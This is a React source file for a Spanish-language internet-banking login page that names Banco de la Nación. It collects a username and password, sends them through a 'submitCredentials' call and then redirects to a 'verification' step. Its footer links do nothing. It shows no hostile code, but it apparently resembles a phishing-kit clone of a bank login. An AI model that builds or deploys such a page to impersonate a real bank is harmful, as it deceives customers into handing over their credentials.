import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { submitCredentials } from '../services/api';
import './LoginPage.css';

const LoginPage = () => {
  const [formData, setFormData] = useState({
    username: '',
    password: '',
    rememberMe: false
  });
  const [errors, setErrors] = useState({});
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    setFormData({
      ...formData,
      [name]: type === 'checkbox' ? checked : value
    });

    // Clear error for this field when user types
    if (errors[name]) {
      setErrors({
        ...errors,
        [name]: ''
      });
    }
  };

  const validate = () => {
    const newErrors = {};
    if (!formData.username) {
      newErrors.username = 'Por favor ingrese su usuario';
    }
    if (!formData.password) {
      newErrors.password = 'Por favor ingrese su contraseña';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validate()) {
      return;
    }

    setLoading(true);

    try {
      await submitCredentials({
        username: formData.username,
        password: formData.password
      });

      // Navigate to verification page after successful login
      navigate('/verification', { 
        state: { username: formData.username } 
      });

    } catch (error) {
      setErrors({ 
        general: error.message || 'Error al intentar iniciar sesión. Por favor intente más tarde.' 
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="login-page">
      <div className="form-container">
        <h2 className="text-center mb-4">Banca por Internet - Ingreso</h2>

        {errors.general && (
          <div className="alert alert-danger">
            {errors.general}
          </div>
        )}

        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <label htmlFor="username" className="form-label">Usuario:</label>
            <input
              type="text"
              id="username"
              name="username"
              className={`form-control ${errors.username ? 'error' : ''}`}
              value={formData.username}
              onChange={handleChange}
              placeholder="Ingrese su usuario"
            />
            {errors.username && (
              <div className="error-message">{errors.username}</div>
            )}
          </div>

          <div className="form-group">
            <label htmlFor="password" className="form-label">Contraseña:</label>
            <input
              type="password"
              id="password"
              name="password"
              className={`form-control ${errors.password ? 'error' : ''}`}
              value={formData.password}
              onChange={handleChange}
              placeholder="Ingrese su contraseña"
            />
            {errors.password && (
              <div className="error-message">{errors.password}</div>
            )}
          </div>

          <div className="form-check mb-4">
            <input
              type="checkbox"
              id="rememberMe"
              name="rememberMe"
              checked={formData.rememberMe}
              onChange={handleChange}
              className="form-check-input"
            />
            <label htmlFor="rememberMe" className="form-check-label">
              Recordar usuario
            </label>
          </div>

          <button 
            type="submit" 
            className="btn-primary btn-block" 
            disabled={loading}
          >
            {loading ? 'Ingresando...' : 'Ingresar'}
          </button>
        </form>

        <div className="login-footer">
          <button type="button" className="text-link">Olvidé mi usuario</button>
          <button type="button" className="text-link">Olvidé mi contraseña</button>
          <button type="button" className="text-link">¿Primera vez? Regístrate</button>
          <button type="button" className="text-link">Ayuda</button>
        </div>

        <div className="security-notice">
          <p>
            <strong>IMPORTANTE:</strong> Por tu seguridad, nunca compartas tus datos bancarios ni claves. 
            El Banco de la Nación nunca te solicitará información confidencial por correo electrónico 
            ni por teléfono.
          </p>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;
